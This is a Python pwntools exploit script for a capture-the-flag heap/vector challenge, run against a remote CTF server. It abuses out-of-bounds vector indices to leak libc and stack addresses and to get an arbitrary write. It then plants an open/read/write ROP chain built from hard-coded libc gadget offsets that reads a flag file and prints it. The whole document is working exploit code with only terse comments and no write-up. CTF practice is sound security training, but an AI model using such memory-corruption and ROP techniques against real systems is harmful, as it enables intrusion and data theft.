from pwn import *

exe = ELF("./chall_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

def set_element(vec_idx, ele_idx, val):
    p.sendlineafter(b"4. Exit", b"2")
    p.sendlineafter(b"vector index:\n", f"{vec_idx}".encode())
    p.sendlineafter(b"element index:\n", f"{ele_idx}".encode())
    p.sendlineafter(b"value:\n", f"{val}".encode())
    
def print_element(vec_idx, ele_idx):
    p.sendlineafter(b"4. Exit", b"3")
    p.sendlineafter(b"vector index:\n", f"{vec_idx}".encode())
    p.sendlineafter(b"element index:\n", f"{ele_idx}".encode())

def add_vector(size):
    p.sendlineafter(b"4. Exit", b"1")
    p.sendlineafter(b"size:\n", f"{size}".encode())

p = remote("chall.ctf.k1nd4sus.it", 31003)
#p = process("./chall_patched_patched")
#p = gdb.debug("./chall_patched_patched", gdbscript = script)

# abuse out of bound, leak libc, stack, heap, via stdout in binary
print_element(-4, 27)
libc_base = int(p.recvline(), 10) - 0x202030

print_element(-4, 0xcf3)
rbp = int(p.recvline(), 10) - 0x138

# make ptr point to rbp
set_element(-12, 15349, rbp << 16)

# change size of index 0 (saved rbp) to bigger size
set_element(-12, 15351, -1)

# perform ROP
open_func = libc_base + libc.symbols['open']
read_func = libc_base + libc.symbols['read']
write_func = libc_base + libc.symbols['write']
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
pop_rsi = libc_base + 0x0000000000110a4d
pop_rbx = libc_base + 0x00000000000586d4
mov_rdi_rax_call_rbx = libc_base + 0x00000000000de942
pop_rdx_leave = libc_base + 0x000000000009819d
add_rsp_0x18 = libc_base + 0x000000000010ecaf

rop = [rbp + 0x8 * 15, pop_rdi,
       rbp + 0x8 * 20, pop_rsi,
       0, open_func,
       pop_rbx, add_rsp_0x18,
       mov_rdi_rax_call_rbx, 0,
       0, pop_rsi,
       rbp + 0x8 * 20, pop_rdx_leave,
       0x50, 0,
       read_func, pop_rdi,
       1, write_func,
       u64(b"./flag".ljust(8, b"\x00"))]

for i in range(len(rop)):
    set_element(0, i, rop[i])

# exit -> trigger ROP
p.sendlineafter(b"4. Exit", b"4")

p.interactive()
